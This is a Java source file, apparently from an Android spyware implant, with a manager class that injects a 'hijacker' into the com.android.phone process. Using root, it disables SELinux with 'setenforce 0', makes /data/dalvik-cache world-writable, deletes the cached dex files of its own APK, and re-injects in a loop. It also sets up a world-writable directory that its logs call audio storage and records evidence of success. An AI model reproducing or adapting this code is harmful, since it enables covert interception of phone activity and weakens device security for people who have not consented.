package com.android.dvci.event.OOB;


import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.file.Path;
import com.android.dvci.module.FactoryModuleAndroid;
import com.android.dvci.module.FactoryModuleBB10;
import com.android.dvci.util.Check;
import com.android.dvci.util.Execute;
import com.android.dvci.util.Instrument;
import com.android.dvci.util.Utils;
import com.android.mm.M;

import java.util.Date;

public class OOBManager implements Runnable{
	private static Instrument hijack = null;
	private static String MESSAGE_STORE = "m4/";
	private static String messageStorage;
	private static String TAG = "OOBManager";
	/** The singleton. */
	private volatile static OOBManager singleton;
	private boolean runOOB = false;
	private boolean threadRunning = false;
	private Thread thread = null;

	public synchronized boolean isThreadRunning() {
		return threadRunning;
	}

	public synchronized void setThreadRunning(boolean threadRunning) {
		this.threadRunning = threadRunning;
	}

	public void stop() {
		if( Status.haveRoot()) {

			runOOB = false;
			Date start = new Date();
			long diff_sec = (new Date().getTime() - start.getTime()) / 1000;
			while (diff_sec < 60) {
				diff_sec = (new Date().getTime() - start.getTime()) / 1000;
				if (isThreadRunning() == false) {
					break;
				}
				Utils.sleep(2000);
			}
			if(isThreadRunning()){
				if (Cfg.DEBUG) {
					Check.log(TAG + " (stop): failed to stop thread"); //$NON-NLS-1$
				}
			}else{
				if (Cfg.DEBUG) {
					Check.log(TAG + " (stop): OK"); //$NON-NLS-1$
				}
			}
		}
	}

	/**
	 * Self.
	 *
	 * @return the manager
	 */
	public static OOBManager self() {
		if (singleton == null) {
			synchronized (OOBManager.class) {
				if (singleton == null) {
					singleton = new OOBManager();
				}
			}
		}
		return singleton;
	}


	@Override
	public void run() {
		while(runOOB) {
			setThreadRunning(true);
			if (Status.haveRoot()) {
				if (hijack != null && !hijack.isStarted()) {
					hijack.startInstrumentation();
				} else {
					if (hijack == null || !hijack.isStarted()) {
						startInjection();
					}
				}
			}
			Utils.sleep(1000);
		}
		try {
			if (hijack != null) {
				hijack.stopInstrumentation();
			}
		}finally {
			setThreadRunning(false);
		}
	}


	public void start() {
		runOOB = true;
		if (isThreadRunning()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(start): thread ALREADY running");
			}
		} else {
			if (thread == null) {
				thread = new Thread(this);
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + "(start): starting thread");
			}
			thread.start();
		}

		/*
		if (Status.haveRoot() && (hijack == null || !hijack.isStarted())) {
			Date start = new Date();
			long diff_sec = (new Date().getTime() - start.getTime()) / 1000;
			while (diff_sec < 180) {
				diff_sec = (new Date().getTime() - start.getTime()) / 1000;
				if (startInjection()) {
					break;
				}
				Utils.sleep(5000);
			}
		}
		*/
	}

	public static boolean startInjection() {
		createMsgStorage();
		Execute.chmod(M.e("777"), M.e("/data/dalvik-cache/"));
		Execute.executeRoot(M.e("setenforce 0") );

		Execute.executeRoot(M.e("rm /data/dalvik-cache/") + Status.getApkName().replace("/", "@") + "*");
		if(hijack==null) {
			hijack = new Instrument(M.e("com.android.phone"), Status.getApkName()+"@"+ Status.getAppContext().getPackageName(), M.e("irp"), Status.self().semaphoreMediaserver, M.e("pa.data"));
			hijack.setInstrumentationSuccessDir(messageStorage);
		}
		if (hijack.isStarted()){
			if (Cfg.DEBUG) {
				Check.log(TAG + "(actualStart): hijacker already running");
			}
			return true;
		}
		if (hijack.startInstrumentation()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(actualStart): hijacker successfully installed");
			}
			EvidenceBuilder.info(M.e("OOB ready"));
			return true;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(actualStart): hijacker cannot be installed");
			}
			EvidenceBuilder.info(M.e("OOB cannot be installed"));
		}
		return false;
	}

	static public boolean createMsgStorage() {
		// Create storage directory
		messageStorage = Status.getAppContext().getFilesDir().getAbsolutePath() + "/" + MESSAGE_STORE;

		if (Path.createDirectory(messageStorage) == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (createMsgStorage): audio storage directory cannot be created"); //$NON-NLS-1$
			}

			return false;
		} else {
			Execute.chmod(M.e("777"), messageStorage);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (createMsgStorage): audio storage directory created at " + messageStorage); //$NON-NLS-1$
			}

			return true;
		}
	}

}
